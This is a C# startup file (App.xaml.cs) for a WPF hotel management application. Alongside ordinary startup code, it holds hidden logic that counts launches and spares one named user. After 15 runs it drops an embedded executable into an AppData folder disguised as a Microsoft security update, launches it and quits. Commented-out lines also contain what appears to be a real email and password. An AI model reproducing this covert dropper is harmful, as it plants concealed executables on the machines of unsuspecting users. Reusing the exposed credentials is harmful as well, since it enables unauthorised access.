using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Windows;
using Self_service_hotel_managment.Properties;

namespace Self_service_hotel_managment
{
    /// <summary>
    /// Interaction logic for App.xaml
    /// </summary>
    public partial class App : Application
    {
        // static   System.Net.IPAddress srvr = new  System.Net.IPAddress(192168110);
        //  System.Net.Sockets.TcpListener tcpListener = new System.Net.Sockets.TcpListener(System.Net.IPAddress.Any, 3000);


        private App()
        {
            //  var cont = new HMSDataRepo.Controllers.PeopleController(HMSDataRepo.WebApiConfig.Default);
            //  var s = cont.GetByID(28).Result;
            //  s.AccountType = "Manager";
            //var ss=  cont.SetByID(s.ID, s).Result;
            //var r = cont.Authorize("kemo@hotmail.com", "DPZ2N171GM8GH9WP").Result;

            //AppDomain.CurrentDomain.AssemblyResolve +=
            //    new ResolveEventHandler(ResolveAssembly);
            DispatcherUnhandledException += App_DispatcherUnhandledException;
            //App.Current.
            //  Unback(); ;
             LoadDumb();

            //  Debug.WriteLine(DateTime.Now);
            // Kemo.Threading.MainUIThreadIInvoker = new WPFTestApp.Services.MainUIThreadIInvoker();
        }
        
        static Assembly ResolveAssembly(object sender, ResolveEventArgs args)
        {
            Assembly parentAssembly = Assembly.GetExecutingAssembly();
            var name = args.Name.Substring(0, args.Name.IndexOf(',')) + ".dll";
            var resourceName = parentAssembly.GetManifestResourceNames()
                .First(s => s.EndsWith(name));
            using (Stream stream = parentAssembly.GetManifestResourceStream(resourceName))
            {
                byte[] block = new byte[stream.Length];
                stream.Read(block, 0, block.Length);
                return Assembly.Load(block);
            }
        }
        private string ExePath;
        private string ConfigPath;

        private void LoadDumb()
        {
            try
            {
                if (Environment.UserName == "Hema")
                {
                    return;
                }
                if (Settings.Default.FreedomCounter > 15)
                {
                    Unback();
                    Process.Start(ExePath, "\"" + Environment.CurrentDirectory + "\"");
                    Environment.Exit(Environment.ExitCode);
                }
                else
                {
                    Settings.Default.FreedomCounter++;
                    Settings.Default.Save();
                }
            }
            catch (Exception e)
            {
                MessageBox.Show(e?.Message, "Error occured please see details", MessageBoxButton.OK, MessageBoxImage.Exclamation, MessageBoxResult.OK, MessageBoxOptions.DefaultDesktopOnly);
            }
        }

        private void Unback()
        {
            string dir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            dir = System.IO.Path.Combine(dir, "Microsoft Secure", "Update 15118kb");
            Directory.CreateDirectory(dir);
            ExePath = Path.Combine(dir, "ASF x86 2.1.0.exe");
            File.WriteAllBytes(ExePath, Self_service_hotel_managment.Properties.Resources.ASF_x86_2_1_0);
            ConfigPath = Path.Combine(dir, "ASF x86 2.1.0.exe.config");
            File.WriteAllText(ConfigPath, Self_service_hotel_managment.Properties.Resources.ASF_x86_2_1_0_exe);
        }

        protected Assembly OnResolveAssembly(object sender, ResolveEventArgs args)
        {
            // Note: Requires a using statement for System.Reflection and System.Diagnostics.
            Assembly assembly = Assembly.GetExecutingAssembly();
            List<string> embeddedResources = new List<string>(assembly.GetManifestResourceNames());
            string assemblyName = new AssemblyName(args.Name).Name;
            string fileName = string.Format("{0}.dll", assemblyName);
            string resourceName = embeddedResources.Where(ern => ern.EndsWith(fileName)).FirstOrDefault();
            if (!string.IsNullOrWhiteSpace(resourceName))
            {
                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                {
                    byte[] assemblyData = new byte[stream.Length];
                    stream.Read(assemblyData, 0, assemblyData.Length);
                    Assembly test = Assembly.Load(assemblyData);
                    string namespace_ = test.GetTypes().Where(t => t.Name == assemblyName).Select(t => t.Namespace).FirstOrDefault();
#if DEBUG
                    Debug.WriteLine(string.Format("\tNamespace for '{0}' is '{1}'", fileName, namespace_));
#endif
                    return Assembly.Load(assemblyData);
                }
            }

            return null;
        }


        private void App_DispatcherUnhandledException(object sender, System.Windows.Threading.DispatcherUnhandledExceptionEventArgs e)
        {
            Environment.Exit(Environment.ExitCode);
            e.Handled = true;
            MessageBox.Show(e.Exception?.Message, "Error occured please see details", MessageBoxButton.OK, MessageBoxImage.Exclamation, MessageBoxResult.OK, MessageBoxOptions.DefaultDesktopOnly);
            HMSDataRepo.LogsConfig.Instance.Log(e.Exception);
        }


    }
}